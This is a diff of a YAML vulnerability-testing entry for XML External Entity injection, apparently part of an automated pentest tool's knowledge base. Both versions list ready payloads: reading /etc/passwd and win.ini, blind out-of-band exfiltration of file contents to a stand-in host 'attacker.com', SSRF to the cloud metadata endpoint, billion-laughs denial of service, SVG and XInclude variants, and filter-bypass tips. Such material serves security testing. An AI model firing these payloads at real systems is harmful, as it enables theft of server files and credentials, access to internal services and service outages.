@@ -1,41 +1,87 @@
 id: XXE
-name: XML External Entity Injection
+name: XML External Entity — Comprehensive
 cwe:
 - CWE-611
 owasp: A05:2021 Security Misconfiguration
 severity_range: High - Critical
-description: Application parses XML input with external entity processing enabled, allowing file read, SSRF, or denial of
-  service.
+description: XXE occurs when XML parsers process external entities, enabling file read, SSRF, DoS, and sometimes RCE. Common
+  in SOAP APIs, legacy XML-RPC, file upload (.docx, .xlsx, .svg), and SAML implementations.
 detection:
-  payloads:
-    file_read:
-    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
-    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
-    blind_oob:
-    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
-    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=test">]><foo>&xxe;</foo>
-    ssrf_via_xxe:
-    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
-    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>
-    dos_billion_laughs:
-    - <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><foo>&lol2;</foo>
-    parameter_entities:
-    - <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil
-      SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfil;]>
   strategy:
-  - 1. Identify XML input points (API endpoints, file uploads, SOAP, SVG)
-  - 2. Test with simple external entity referencing a known file
-  - 3. If no direct output, test blind XXE with OOB callback
-  - 4. Test via SVG upload if file upload exists
-  - 5. Test SOAP endpoints with XXE in SOAP body
-  - '6. Check for JSON endpoints that also accept XML (Content-Type: application/xml)'
-  - 7. Test parameter entities for blind exfiltration
-evidence_needed: File content from server, DNS/HTTP callback from blind XXE, or SSRF to internal service via XXE
+  - '1. Identify XML-accepting endpoints (Content-Type: text/xml, application/xml)'
+  - '2. Try injecting basic entity: <!ENTITY test ''mantis-marker''>'
+  - 3. If reflected, escalate to external entity SYSTEM
+  - 4. For blind XXE, use OOB callback via parameter entity
+  - '5. Test file upload formats that contain XML: .docx, .xlsx, .pptx, .svg, .xml'
+  attack_classes:
+    in_band_file_read:
+      description: External entity content reflected in response
+      payload: '<?xml version="1.0"?>
+
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+        <foo>&xxe;</foo>'
+      severity: high
+    blind_oob:
+      description: Parameter entity exfiltrates data via OOB DTD
+      payload: '<?xml version="1.0"?>
+
+        <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+
+        <foo/>'
+      external_dtd: '<!ENTITY % file SYSTEM "file:///etc/passwd">
+
+        <!ENTITY % all "<!ENTITY data SYSTEM ''http://attacker.com/?d=%file;''>">
+
+        %all;'
+      severity: critical
+    ssrf_via_xxe:
+      description: External entity to internal URLs
+      payload: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+      severity: high
+    billion_laughs_dos:
+      description: Recursive entity expansion
+      payload: "<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"\
+        >\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  ...&lol9;\n]>"
+      severity: high
+    xxe_via_svg:
+      description: Upload SVG with XXE
+      payload: '<?xml version="1.0"?>
+
+        <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+        <svg>&xxe;</svg>'
+      severity: high
+    xxe_via_docx:
+      description: Modify document.xml inside .docx zip to include XXE
+      severity: high
+    soap_xxe:
+      description: Inject XXE into SOAP request body
+      severity: critical
+    saml_xxe:
+      description: XXE in SAMLResponse XML
+      severity: critical
+    xinclude_attack:
+      description: Alternative to entity injection when DTD blocked
+      payload: <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+      severity: high
+filter_bypasses:
+- If DOCTYPE filtered, try CDATA tricks or XInclude
+- If external entities filtered, try parameter entities (%xxe;)
+- UTF-7 encoding bypasses some parsers
+- Use different DOCTYPE position (after PI, between elements)
 ai_research_hints:
-- Check if JSON APIs also accept XML by changing Content-Type header
-- Test file upload endpoints with SVG containing XXE
-- Check for XSLT injection which can lead to similar impacts
-- Test DOCX/XLSX uploads — they're ZIP files containing XML
+- Modern Java apps often use Xerces with safer defaults — older versions widely vulnerable
+- .NET XmlDocument is unsafe by default below .NET 4.5.2
+- PHP libxml is unsafe with LIBXML_NOENT flag set
+- Python lxml is safe by default but vulnerable when parsing user-provided DTDs
+- Office file formats (.docx, .xlsx) are ZIP containers with XML inside — perfect XXE vector
+- SVG uploads frequently bypass MIME validation but get parsed as XML
+tools:
+- XXEinjector
+- Burp Active Scan
+- OOB callback server
 references:
 - https://portswigger.net/web-security/xxe
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+- https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
